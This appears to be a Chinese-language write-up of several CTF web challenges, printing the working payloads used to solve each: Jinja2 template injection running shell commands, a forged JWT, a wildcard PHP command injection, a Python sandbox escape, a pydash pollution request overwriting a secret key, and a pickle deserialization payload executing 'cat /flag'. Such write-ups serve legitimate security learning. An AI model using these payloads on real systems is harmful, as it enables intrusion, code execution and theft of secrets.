## 渲染如呼吸一样简单
输入{{7*7}}返回49，判断为Jinja2模版注入，本题没有过滤  
```python
{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
```
这里flag不在/flag目录，在环境变量里面  
```python
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
```

## 错位的签名
登录爆破
```python
账号：guest
密码：guest123
```
拿到公钥和提示，是JWT伪造  
点击/flag页面url中会有jwt。用在线JWT工具就进行公钥签名，生成之后再替换原来的JWT就行  
```python
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.4mckT5MkBYZtNUTQ_SdkpNHra5qDxUgox_eaVdg_mZw
```
<img width="1858" height="977" alt="image" src="https://github.com/user-attachments/assets/901b9a3c-ef89-4d32-b54d-6353b214bfe8" />

## 一切的开始
扫一下目录，发现/robots.txt,访问/inex233页面，最简单的传参加cookie和Referer  
<img width="1860" height="742" alt="image" src="https://github.com/user-attachments/assets/afc7bc70-657c-4a0c-b042-e49d65eedeb1" />

## ez_64
源码：  
```python
<?php
chdir(__DIR__);

if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (preg_match("#^[/?. fla64]*$#", $c)) {
        system($c);
    } else {
        die("no no no!");
    }
} else {
    highlight_file(__FILE__);
}
```
只允许由 /?.fla64 中的字符组成，可以使用通配符?进行匹配  
这里用/bin/base64把flag文件编码输出  
```python
?c=/???/?a??64 fla?.???   //flag.php
```
得到base64字符串，再解码即可  
<img width="1266" height="390" alt="image" src="https://github.com/user-attachments/assets/c37639fc-4145-46b7-a928-3fcb91cd7736" />

## 漏风的沙箱
源码ban了很多关键词，self和dict没过滤，可以通过这个方法拿回所属的实例，再把实例身上所有属性全部扒出来  
列出目录文件  
<img width="1142" height="617" alt="image" src="https://github.com/user-attachments/assets/c8fdda1e-5d53-4501-adcf-edb4f1b3ca86" />  
拿到flag  
```markdown
f=print.__self__.__dict__["op"+"en"]("/app/flag.txt")
for l in f: print(l)
```
<img width="1205" height="592" alt="image" src="https://github.com/user-attachments/assets/bb03d838-b8c3-4323-83d3-2e4192ab5ec5" />

## ATP代码实验
F12和右键都被禁用，但是可以通过浏览器菜单打开开发者工具，然后禁用JS即可复制粘贴

## 奶娃的博客
需要把每个碎片集齐，得到：H4sIAAAAAAAA/wTAwQ2AMAgF0JXaADM4xo9BbQ+UA0GrMe7uK/eyjv11rpNhfLYu0OBpAvYNWsxIU0AXxYMjuA3yBGsUEWQnVE8Kp/z+AAAA//+XJ0P/SwAAAA==  
这一串是bas64+zip的压缩数据，写个脚本解码解压即可获得flag  
```python
import re, html, base64, gzip, urllib.request

B = "http://8000-e17cb714-5905-46c3-ba36-b268ba5f06b7.challenge.ctfplus.cn"
s = "".join(
    html.unescape(re.findall(r'class="flag-fragment"[^>]*>(.*?)</span>',
        urllib.request.urlopen(f"{B}/page?id={i}").read().decode("utf-8", "ignore"))[0])
    for i in range(1, 125)
)
print(gzip.decompress(base64.b64decode(s)).decode())
```

## pollute the key
考查原型链污染，python的pickle反序列化  
审计源码，发现/api/user/update相关代码有漏洞利用点：可以用pydash原型链污染这个接口，我们可以污染jwt签名的key,绕过admin  
```python
fetch('/api/user/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({key: '__class__.__init__.__globals__.SECRET_KEY', value: 'secretkey'})
}).then(r => r.json()).then(console.log);
```
然后把cookie的token拿去伪造  
<img width="600" alt="image" src="https://github.com/user-attachments/assets/49d6560c-dcc6-4fbb-b1e7-1c3afd92c0ad" />  
拿到admin  
<img width="600" alt="image" src="https://github.com/user-attachments/assets/55f71847-6cfb-47bb-8e3d-3fa0e1a2dfd7" />  
/api/order/buy接口存在pickle反序列化  
提示pickle+base64提交  
<img width="1113" height="286" alt="image" src="https://github.com/user-attachments/assets/25ce48af-ad2e-4bde-8a6e-f89b7c0d7be7" />
写个pickle脚本执行cat /flag并存在x.txt  
```python
import base64, pickle

class P:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('cat /flag > /app/static/x.txt')",))

print(base64.b64encode(pickle.dumps(P(), protocol=0)).decode())
```
去/static/x.txt拿到flag
<img width="600" alt="image" src="https://github.com/user-attachments/assets/e8921f7d-036d-433e-bb60-971d533f2b4b" />
